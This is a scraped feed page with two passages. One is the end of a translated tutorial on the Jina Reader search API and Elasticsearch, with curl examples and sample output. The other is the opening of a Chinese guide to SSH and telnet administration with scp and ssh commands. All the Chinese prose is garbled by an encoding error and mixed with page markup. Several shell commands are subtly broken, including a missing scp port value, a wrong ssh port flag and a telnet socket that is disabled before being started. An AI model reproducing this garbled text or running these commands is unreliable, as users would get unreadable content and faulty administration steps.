<span class="hljs-number">16.</span>  _Acquisition advances Elasticâ€™s leadership <span class="hljs-keyword">in</span> retrieval, embeddings, <span class="hljs-keyword">and</span> context engineering <span class="hljs-keyword">to</span> power agentic AI_

`AIå†™ä»£ç <span class="hljs-operator">!</span>[](https:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>csdnimg.cn<span class="hljs-operator">/</span><span class="hljs-keyword">release</span><span class="hljs-operator">/</span>blogv2<span class="hljs-operator">/</span>dist<span class="hljs-operator">/</span>pc<span class="hljs-operator">/</span>img<span class="hljs-operator">/</span>runCode<span class="hljs-operator">/</span>icon<span class="hljs-operator">-</span>arrowwhite.png)
</code></pre>
<p>ä½ å¯ä»¥ä»…<strong>æ‰§è¡Œæœç´¢</strong>ï¼Œè€Œä¸å°è¯•è·å–åº•å±‚é¡µé¢ï¼Œåªéœ€æ·»åŠ è¯·æ±‚å¤´ <code>X-Respond-With: no-content</code>ã€‚ä¾‹å¦‚ï¼š</p>
<pre><code class="hljs language-arduino" lang="arduino">`<span class="hljs-number">1.</span>  curl <span class="hljs-string">"https://s.jina.ai/Elastic+Jina"</span> \
<span class="hljs-number">2.</span>    -H <span class="hljs-string">"Authorization: Bearer &lt;YOUR_API_KEY&gt;"</span> \
<span class="hljs-number">3.</span>    -H <span class="hljs-string">"X-Respond-With: no-content"</span>` AIå†™ä»£ç 
</code></pre>
<p>è¿™ä¼šè¿”å›ä»¥ Markdown æ ¼å¼è¡¨ç¤ºçš„æ–‡æœ¬ï¼Œå¼€å¤´å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-less" lang="less">`

<span class="hljs-number">1</span>.  <span class="hljs-selector-attr">[1]</span> <span class="hljs-selector-tag">Title</span>: <span class="hljs-selector-tag">Elastic</span> <span class="hljs-selector-tag">and</span> <span class="hljs-selector-tag">Jina</span> <span class="hljs-selector-tag">AI</span> <span class="hljs-selector-tag">join</span> <span class="hljs-selector-tag">forces</span> <span class="hljs-selector-tag">to</span> <span class="hljs-selector-tag">advance</span> <span class="hljs-selector-tag">open</span> <span class="hljs-selector-tag">source</span> <span class="hljs-selector-tag">retrieval</span> <span class="hljs-selector-tag">for</span> <span class="hljs-selector-tag">AI</span> ...
<span class="hljs-number">2</span>.  <span class="hljs-selector-attr">[1]</span> <span class="hljs-selector-tag">URL</span> <span class="hljs-selector-tag">Source</span>: <span class="hljs-selector-tag">https</span>:<span class="hljs-comment">//www.elastic.co/blog/elastic-jina-ai</span>
<span class="hljs-number">3</span>.  <span class="hljs-selector-attr">[1]</span> <span class="hljs-selector-tag">Description</span>: <span class="hljs-selector-tag">We</span> <span class="hljs-selector-tag">are</span> <span class="hljs-selector-tag">thrilled</span> <span class="hljs-selector-tag">to</span> <span class="hljs-selector-tag">announce</span> <span class="hljs-selector-tag">that</span> <span class="hljs-selector-tag">Elastic</span> <span class="hljs-selector-tag">has</span> <span class="hljs-selector-tag">joined</span> <span class="hljs-selector-tag">forces</span> <span class="hljs-selector-tag">with</span> <span class="hljs-selector-tag">Jina</span> <span class="hljs-selector-tag">AI</span>, <span class="hljs-selector-tag">a</span> <span class="hljs-selector-tag">pioneer</span> <span class="hljs-selector-tag">in</span> <span class="hljs-selector-tag">open</span> <span class="hljs-selector-tag">source</span> <span class="hljs-selector-tag">multimodal</span> <span class="hljs-selector-tag">and</span> <span class="hljs-selector-tag">multilingual</span> <span class="hljs-selector-tag">embeddings</span>, ...
<span class="hljs-number">4</span>.  <span class="hljs-selector-attr">[1]</span> <span class="hljs-selector-tag">Date</span>: <span class="hljs-selector-tag">Oct</span> <span class="hljs-number">9</span>, <span class="hljs-number">2025</span>

<span class="hljs-number">7</span>.  <span class="hljs-selector-attr">[2]</span> <span class="hljs-selector-tag">Title</span>: <span class="hljs-selector-tag">Elastic</span> <span class="hljs-selector-tag">Completes</span> <span class="hljs-selector-tag">Acquisition</span> <span class="hljs-selector-tag">of</span> <span class="hljs-selector-tag">Jina</span> <span class="hljs-selector-tag">AI</span>, <span class="hljs-selector-tag">a</span> <span class="hljs-selector-tag">Leader</span> <span class="hljs-selector-tag">in</span> <span class="hljs-selector-tag">Frontier</span> <span class="hljs-selector-tag">Models</span> ...
<span class="hljs-number">8</span>.  <span class="hljs-selector-attr">[2]</span> <span class="hljs-selector-tag">URL</span> <span class="hljs-selector-tag">Source</span>: <span class="hljs-selector-tag">https</span>:<span class="hljs-comment">//ir.elastic.co/news/news-details/2025/Elastic-Completes-Acquisition-of-Jina-AI-a-Leader-in-Frontier-Models-for-Multimodal-and-Multilingual-Search/default.aspx</span>
<span class="hljs-number">9</span>.  <span class="hljs-selector-attr">[2]</span> <span class="hljs-selector-tag">Description</span>: <span class="hljs-selector-tag">The</span> <span class="hljs-selector-tag">acquisition</span> <span class="hljs-selector-tag">of</span> <span class="hljs-selector-tag">Jina</span> <span class="hljs-selector-tag">AI</span> <span class="hljs-selector-tag">broadens</span> <span class="hljs-selector-tag">Elastic</span>'<span class="hljs-selector-tag">s</span> <span class="hljs-selector-tag">leadership</span> <span class="hljs-selector-tag">in</span> <span class="hljs-selector-tag">relevance</span> <span class="hljs-selector-tag">for</span> <span class="hljs-selector-tag">unstructured</span> <span class="hljs-selector-tag">data</span> <span class="hljs-selector-tag">by</span> <span class="hljs-selector-tag">adding</span> <span class="hljs-selector-tag">dense</span> <span class="hljs-selector-tag">vector</span>, <span class="hljs-selector-tag">multilingual</span> <span class="hljs-selector-tag">and</span> <span class="hljs-selector-tag">multimodal</span> ...
<span class="hljs-number">10</span>.  <span class="hljs-selector-attr">[2]</span> <span class="hljs-selector-tag">Date</span>: <span class="hljs-selector-tag">Oct</span> <span class="hljs-number">9</span>, <span class="hljs-number">2025</span>

<span class="hljs-number">13</span>.  <span class="hljs-selector-attr">[3]</span> <span class="hljs-selector-tag">Title</span>: <span class="hljs-selector-tag">Jina</span> <span class="hljs-selector-tag">AI</span> <span class="hljs-selector-tag">-</span> <span class="hljs-selector-tag">Elasticsearch</span> <span class="hljs-selector-tag">Labs</span>
<span class="hljs-number">14</span>.  <span class="hljs-selector-attr">[3]</span> <span class="hljs-selector-tag">URL</span> <span class="hljs-selector-tag">Source</span>: <span class="hljs-selector-tag">https</span>:<span class="hljs-comment">//www.elastic.co/search-labs/integrations/jina</span>
<span class="hljs-number">15</span>.  <span class="hljs-selector-attr">[3]</span> <span class="hljs-selector-tag">Description</span>: <span class="hljs-selector-tag">Jina</span> <span class="hljs-selector-tag">AI</span> <span class="hljs-selector-tag">is</span> <span class="hljs-selector-tag">now</span> <span class="hljs-selector-tag">part</span> <span class="hljs-selector-tag">of</span> <span class="hljs-selector-tag">Elastic</span>, <span class="hljs-selector-tag">bringing</span> <span class="hljs-selector-tag">its</span> <span class="hljs-selector-tag">high-performance</span> <span class="hljs-selector-tag">multilingual</span> <span class="hljs-selector-tag">and</span> <span class="hljs-selector-tag">multimodal</span> <span class="hljs-selector-tag">search</span> <span class="hljs-selector-tag">AI</span> <span class="hljs-selector-tag">to</span> <span class="hljs-selector-tag">Elasticsearch</span>'<span class="hljs-selector-tag">s</span> <span class="hljs-selector-tag">powerful</span> <span class="hljs-selector-tag">data</span> <span class="hljs-selector-tag">storage</span>, <span class="hljs-selector-tag">retrieval</span>, <span class="hljs-selector-tag">and</span> ...

<span class="hljs-number">18</span>.  <span class="hljs-selector-attr">[4]</span> <span class="hljs-selector-tag">Title</span>: <span class="hljs-selector-tag">Elastic</span> <span class="hljs-selector-tag">Completes</span> <span class="hljs-selector-tag">Acquisition</span> <span class="hljs-selector-tag">of</span> <span class="hljs-selector-tag">Jina</span> <span class="hljs-selector-tag">AI</span>, <span class="hljs-selector-tag">a</span> <span class="hljs-selector-tag">Leader</span> <span class="hljs-selector-tag">in</span> <span class="hljs-selector-tag">Frontier</span> <span class="hljs-selector-tag">Models</span> ...
<span class="hljs-number">19</span>.  <span class="hljs-selector-attr">[4]</span> <span class="hljs-selector-tag">URL</span> <span class="hljs-selector-tag">Source</span>: <span class="hljs-selector-tag">https</span>:<span class="hljs-comment">//finance.yahoo.com/news/elastic-completes-acquisition-jina-ai-130200685.html</span>
<span class="hljs-number">20</span>.  <span class="hljs-selector-attr">[4]</span> <span class="hljs-selector-tag">Description</span>: <span class="hljs-selector-tag">Elastic</span>'<span class="hljs-selector-tag">s</span> <span class="hljs-selector-tag">addition</span> <span class="hljs-selector-tag">of</span> <span class="hljs-selector-tag">Jina</span> <span class="hljs-selector-tag">AI</span> <span class="hljs-selector-tag">demonstrates</span> <span class="hljs-selector-tag">its</span> <span class="hljs-selector-tag">continued</span> <span class="hljs-selector-tag">commitment</span> <span class="hljs-selector-tag">to</span> <span class="hljs-selector-tag">delivering</span> <span class="hljs-selector-tag">open</span>, <span class="hljs-selector-tag">accessible</span>, <span class="hljs-selector-tag">and</span> <span class="hljs-selector-tag">production-ready</span> <span class="hljs-selector-tag">Search</span> <span class="hljs-selector-tag">AI</span> <span class="hljs-selector-tag">at</span> <span class="hljs-selector-tag">scale</span>.
<span class="hljs-number">21</span>.  <span class="hljs-selector-attr">[4]</span> <span class="hljs-selector-tag">Date</span>: <span class="hljs-selector-tag">Oct</span> <span class="hljs-number">9</span>, <span class="hljs-number">2025</span>

`<span class="hljs-selector-tag">AI</span>å†™ä»£ç !<span class="hljs-selector-attr">[]</span>(<span class="hljs-attribute">https</span>:<span class="hljs-comment">//csdnimg.cn/release/blogv2/dist/pc/img/runCode/icon-arrowwhite.png)</span>
</code></pre>
<p>Reader è¿˜æä¾›ç»“æ„åŒ–æå–æ¨¡å¼ï¼Œå¦‚æœä½ æ·»åŠ è¯·æ±‚å¤´ <code>Accept: application/json</code>ï¼Œå®ƒä¼šè¿”å› JSON ç»“æ„åŒ–æ•°æ®ã€‚ä¾‹å¦‚ï¼Œè¦æ‰§è¡Œä¸ä¸Šé¢ç›¸åŒçš„æœç´¢ï¼š</p>
<pre><code class="hljs language-arduino" lang="arduino"> `<span class="hljs-number">1.</span>   curl <span class="hljs-string">"https://s.jina.ai/Elastic+Jina"</span> \
<span class="hljs-number">2.</span>    -H <span class="hljs-string">"Authorization: Bearer &lt;YOUR_API_KEY&gt;"</span> \
<span class="hljs-number">3.</span>    -H <span class="hljs-string">"Accept: application/json"</span>`AIå†™ä»£ç 
</code></pre>
<p>è¿™ä¼šä»¥ JSON æ ¼å¼è¿”å›ç›¸åŒçš„ä¿¡æ¯ï¼Œæ–¹ä¾¿å…¶ä»–åº”ç”¨ç¨‹åºè®¿é—®ï¼ŒåŒæ—¶è¿˜åŒ…æ‹¬ä¸€äº›é¡µé¢ metadata å’Œ token ä½¿ç”¨æ‘˜è¦ã€‚ä¸‹é¢çš„ç¤ºä¾‹è¾“å‡ºä¸ºäº†å¯è¯»æ€§å’ŒèŠ‚çœç©ºé—´ï¼Œå¾ˆå¤šå†…å®¹å·²è¢«çœç•¥ï¼ˆç”¨ <code>&lt;...&gt;</code> ä»£æ›¿ï¼‰ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">`

1.  <span class="hljs-string">"data"</span>: [
2.   {
3.     <span class="hljs-string">"title"</span>: <span class="hljs-string">"Elastic Completes Acquisition of Jina AI, a Leader in Frontier Models for Multimodal and Multilingual Search"</span>,
4.     <span class="hljs-string">"url"</span>: <span class="hljs-string">"https://ir.elastic.co/news/news-details/2025/Elastic-Completes-Acquisition-of-Jina-AI-a-Leader-in-Frontier-Models-for-Multimodal-and-Multilingual-Search/default.aspx"</span>,
5.     <span class="hljs-string">"description"</span>: <span class="hljs-string">"Acquisition advances Elasticâ€™s leadership &lt;...&gt;"</span>,
6.     <span class="hljs-string">"date"</span>: <span class="hljs-string">"Oct 9, 2025"</span>,
7.     <span class="hljs-string">"content"</span>: <span class="hljs-string">"### Elastic Completes Acquisition of Jina AI&lt;...&gt;"</span>,
8.     <span class="hljs-string">"metadata"</span>: {
9.       <span class="hljs-string">"lang"</span>: <span class="hljs-string">"en-US"</span>,
10.       &lt;...&gt;
11.     },
12.     <span class="hljs-string">"usage"</span>: {
13.       <span class="hljs-string">"tokens"</span>: 1447
14.     }
15.   },
16.   {
17.     <span class="hljs-string">"title"</span>: <span class="hljs-string">"Elastic Completes Acquisition of Jina AI, a Leader in Frontier Models for Multimodal and Multilingual Search"</span>,
18.     <span class="hljs-string">"url"</span>: <span class="hljs-string">"https://finance.yahoo.com/news/elastic-completes-acquisition-jina-ai-130200685.html"</span>,
19.   &lt;...&gt;

`AIå†™ä»£ç ![](https://csdnimg.cn/release/blogv2/dist/pc/img/runCode/icon-arrowwhite.png)
</code></pre>
<p>è¿™ä¸ª API è¿˜æœ‰æ›´å¤šé€‰é¡¹ã€‚æ¬²äº†è§£å®Œæ•´ä¿¡æ¯ï¼ŒåŒ…æ‹¬å¯é€‰å‚æ•°åŠå…¶å¯¹åº”çš„ headersï¼Œè¯·è®¿é—® <a href="https://link.juejin.cn?target=https%3A%2F%2Fjina.ai%2Fapi-dashboard%2Freader" title="https://jina.ai/api-dashboard/reader" target="_blank" ref="nofollow noopener noreferrer">Reader API é¡µé¢</a>ã€‚</p>
<h2 data-id="heading-6">Reader ä¸ Elasticsearch</h2>
<p>Reader API æ˜¯ä¸€ä¸ªæ–¹ä¾¿çš„å·¥å…·ï¼Œç”¨äºæ‰§è¡Œè¡¨é¢çœ‹ä¼¼ç®€å•ä½†å®é™…ä¸Šå¹¶ä¸ç®€å•çš„ä»»åŠ¡ã€‚ç½‘ç»œç¯å¢ƒè¶³å¤Ÿå¤æ‚ï¼Œä½ ç¡®å®éœ€è¦ AI æ‰èƒ½å……åˆ†åˆ©ç”¨å®ƒã€‚ä»ç½‘é¡µå’Œ PDF ä¸­æå–æ•°æ®å¯¹ç¨‹åºå‘˜æ¥è¯´æ˜¯ä¸€é¡¹æ‚ä¹±çš„å·¥ä½œï¼Œä½†éå¸¸é€‚åˆ AI è¯­è¨€æ¨¡å‹ã€‚</p>
<p>Reader é€‰æ‹©ä»¥ JSON å’Œ Markdown ä½œä¸ºæ ‡å‡†æ ¼å¼ï¼Œè¿™åæ˜ äº†æ”¯æŒæœ€æœ‰ç”¨ã€å¹¿æ³›æ”¯æŒã€åŒæ—¶åˆç®€å•ä¸”äººç±»å¯è®¿é—®çš„æ•°æ®æ ¼å¼çš„ç­–ç•¥ã€‚</p>
<p>ä½ å¯ä»¥å°† Markdown ç›´æ¥æ”¾å…¥ Elasticsearch æ–‡æ¡£å­˜å‚¨ï¼Œå¹¶ä½¿ç”¨ <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.elastic.co%2Fdocs%2Fapi%2Fdoc%2Felasticsearch%2Fgroup%2Fendpoint-document" title="https://www.elastic.co/docs/api/doc/elasticsearch/group/endpoint-document" target="_blank" ref="nofollow noopener noreferrer">Elastic Document API</a> æä¾›çš„ä»»æ„æ–¹æ³•è¿›è¡Œç´¢å¼•ã€‚æœ€ä½³ç­–ç•¥é€šå¸¸æ˜¯å…ˆä½¿ç”¨ Reader è·å–æ–‡æ¡£ï¼Œç„¶åæ‰¹é‡å¤„ç†ï¼Œæˆ–è€…åœ¨èµ„æºå—é™æ—¶ä½¿ç”¨å°½å¯èƒ½å¤§çš„æ‰¹æ¬¡ã€‚ä½ å¯ä»¥å°† Reader è¾“å‡ºä¸ä»»ä½•æ–‡æœ¬å­˜å‚¨æˆ–ç´¢å¼•ç­–ç•¥ç»“åˆä½¿ç”¨ã€‚</p>
<p>Elasticsearch åœ¨å­˜å‚¨ã€ç´¢å¼•å’Œæ£€ç´¢ä¸­<a href="https://link.juejin.cn?target=https%3A%2F%2Felasticstack.blog.csdn.net%2Farticle%2Fdetails%2F153512057" title="https://elasticstack.blog.csdn.net/article/details/153512057" target="_blank" ref="nofollow noopener noreferrer">å¯¹ JSON æä¾›ç›´æ¥æ”¯æŒ</a>ã€‚JSON æ ¼å¼å¯ä¾›äººå·¥æ£€æŸ¥ï¼Œå¯ä½œä¸ºçº¯æ–‡æœ¬ä¼ è¾“ï¼Œå¹¶åœ¨æ‰€æœ‰ä¸»æµç¼–ç¨‹è¯­è¨€å’Œæ¡†æ¶ä¸­æœ‰å¯é æ”¯æŒï¼ŒåŒæ—¶åœ¨æµè§ˆå™¨ä¸­ä¹Ÿå†…ç½®æ”¯æŒã€‚</p>
<p>Reader é€šè¿‡å°† AI å¼•å…¥ç°å®ä¸–ç•Œç”Ÿæˆçš„æ‚ä¹±æ•°æ®ï¼Œä½¿ä½ çš„ Elastic å®‰è£…æ›´æœ‰ç”¨ã€‚</p>
<p>åŸæ–‡ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.elastic.co%2Fsearch-labs%2Ftutorials%2Fjina-tutorial%2Fjina-reader" title="https://www.elastic.co/search-labs/tutorials/jina-tutorial/jina-reader" target="_blank" ref="nofollow noopener noreferrer">www.elastic.co/search-labsâ€¦</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Ansibleé›†ç¾¤æ‰¹é‡ç®¡ç†ä¸ç»´æŠ¤å®Œå…¨æŒ‡å—]]></title>    <link>https://juejin.cn/post/7594389937463181322</link>    <guid>https://juejin.cn/post/7594389937463181322</guid>    <pubDate>2026-01-13T02:51:40.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594389937463181322" data-draft-id="7594420277448245275" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Ansibleé›†ç¾¤æ‰¹é‡ç®¡ç†ä¸ç»´æŠ¤å®Œå…¨æŒ‡å—"/> <meta itemprop="keywords" content="è‡ªåŠ¨åŒ–è¿ç»´"/> <meta itemprop="datePublished" content="2026-01-13T02:51:40.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="liux3528"/> <meta itemprop="url" content="https://juejin.cn/user/2701939431971706"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Ansibleé›†ç¾¤æ‰¹é‡ç®¡ç†ä¸ç»´æŠ¤å®Œå…¨æŒ‡å—
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2701939431971706/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    liux3528
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-13T02:51:40.000Z" title="Tue Jan 13 2026 02:51:40 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-13
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»8åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">ansibleé›†ç¾¤æ‰¹é‡ç®¡ç†ä¸ç»´æŠ¤</h2>
<h3 data-id="heading-1">ä¸€ã€é›†ç¾¤æ‰¹é‡ç®¡ç†-SSHDæœåŠ¡</h3>
<h4 data-id="heading-2">1.opensshæœåŠ¡</h4>
<ul>
<li>
<p>å®ç°åŠ å¯†çš„è¿œç¨‹è¿æ¥/ä¼ è¾“æ•°æ®</p>
</li>
<li>
<p>openssh-serverï¼ˆsshdï¼Œ/etc/ssh/sshdâ€”â€”configï¼‰</p>
</li>
<li>
<p>openssh-clientsï¼ˆå‘½ä»¤ï¼Œscpï¼Œsshï¼‰</p>
</li>
</ul>
<h4 data-id="heading-3">2.telnet vs openssh</h4>





























<table><thead><tr><th/><th>å…±åŒç‚¹</th><th>åŒºåˆ«</th><th>åº”ç”¨åœºæ™¯</th></tr></thead><tbody><tr><td>opensshæœåŠ¡</td><td>è¿œç¨‹è¿æ¥</td><td>æ•°æ®åŠ å¯†</td><td>é»˜è®¤ä½¿ç”¨</td></tr><tr><td>telnet æœåŠ¡</td><td>è¿œç¨‹è¿æ¥</td><td>æ•°æ®ä¸åŠ å¯†</td><td>å‡çº§opensshæœåŠ¡ä½¿ç”¨</td></tr><tr><td/><td/><td/><td/></tr></tbody></table>
<h5 data-id="heading-4">2.1 telnetæœåŠ¡</h5>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment">#å®‰è£…</span>
yum -y install telnet-server.x86_64

<span class="hljs-comment">#å¯åŠ¨</span>
systemctl <span class="hljs-built_in">disable</span> telnet.socket
systemctl start telnet.socket

<span class="hljs-comment">#xsellè¿æ¥</span>
telnet 10.0.0.61 23
</code></pre>
<h5 data-id="heading-5">2.2 openssh-serveré…ç½®æ–‡ä»¶</h5>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment">#æŸ¥çœ‹è½¯ä»¶åŒ…æ˜¯å¦å®‰è£…ï¼Œé»˜è®¤å·²ç»å®‰è£…</span>
rpm -qa |grep openssh

<span class="hljs-comment">#æŸ¥çœ‹openssh-serveræœ‰å“ªäº›é…ç½®æ–‡ä»¶</span>
rpm -ql openssh-server
</code></pre>
<ul>
<li><strong>æ ¸å¿ƒé…ç½®æ–‡ä»¶</strong>ï¼š<strong>/etc/ssh/sshd_config</strong></li>
</ul>





































<table><thead><tr><th>opensshæœåŠ¡ç«¯é…ç½®è¯¦è§£</th><th/></tr></thead><tbody><tr><td>==è¿æ¥åŠ é€Ÿ==</td><td/></tr><tr><td>UseDNS no</td><td>æ˜¯å¦å¼€å¯åå‘è§£æï¼šip--&gt;åŸŸåæˆ–ä¸»æœºå</td></tr><tr><td>GSSAPIAuthentication no</td><td>GSSè®¤è¯åŠŸèƒ½å…³é—­</td></tr><tr><td>==å®‰å…¨ä¼˜åŒ–é¡¹ç›®==</td><td/></tr><tr><td>Port</td><td>é»˜è®¤ 22   ç«¯å£èŒƒå›´1-65535  æ¨è1wä»¥ä¸Šçš„ç«¯å£</td></tr><tr><td>PermitRootLogin</td><td>ç¦ç”¨rootè¿œç¨‹ç™»å½•æƒé™ã€‚é»˜è®¤æ˜¯yesï¼ˆå¯ä»¥ä¸Šrootè¿œç¨‹ç™»å½•ï¼‰</td></tr><tr><td>ListenAddress</td><td>ç›‘å¬çš„åœ°å€ï¼ˆåé¢éœ€è¦æŒ‡å®šæœ¬åœ°ç½‘å¡çš„åœ°å€ï¼‰å¯ä»¥æ§åˆ¶ç”¨æˆ·åªèƒ½é€šè¿‡å†…ç½‘è®¿é—®</td></tr></tbody></table>
<h5 data-id="heading-6">2.3 openssh-clientsé…ç½®æ–‡ä»¶</h5>
<h6 data-id="heading-7">01 scp     è¿œç¨‹ä¼ è¾“å·¥å…·</h6>
<pre><code class="hljs language-bash" lang="bash">scp  æ–‡ä»¶/ç›®å½•  ç”¨æˆ·å@ip:è·¯å¾„
-r  é€’å½’ä¼ è¾“
-p	ä¿æŒå±æ€§ä¿¡æ¯ä¸å˜
-P	æŒ‡å®šç«¯å£


scp -rp -P /etc/hostname  root@10.0.0.41:/tmp/
</code></pre>
<h6 data-id="heading-8">02 ssh     è¿œç¨‹è¿æ¥</h6>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment">#ä½¿ç”¨rootç”¨æˆ·è¿œç¨‹è¿æ¥åˆ°10.0.0.41çš„22ç«¯å£</span>
ssh -p 22 root@10.0.0.41

<span class="hljs-comment">#ä½¿ç”¨rootç”¨æˆ·è¿œç¨‹è¿æ¥åˆ°10.0.0.41çš„22ç«¯å£å¹¶æ‰§è¡Œwhoamiå’Œpwdå‘½ä»¤</span>
ssh -P 22 root@10.0.0.41 <span class="hljs-string">"whoami pwd"</span>
</code></pre>
<h6 data-id="heading-9">03 sftp    è¿œç¨‹ä¼ è¾“æ–‡ä»¶ï¼ˆä¸€èˆ¬å¼€å‘é€šè¿‡å›¾å½¢åŒ–ç•Œé¢ä½¿ç”¨ftpå·¥å…·ï¼‰ï¼ˆäº†è§£ï¼‰</h6>
<ul>
<li>
<p>ftpå·¥å…·çš„ä¸€ç§</p>
<p>ä¸Šä¼ å¤§æ–‡ä»¶ï¼Œå»ºè®®ä½¿ç”¨ftp</p>
</li>
</ul>
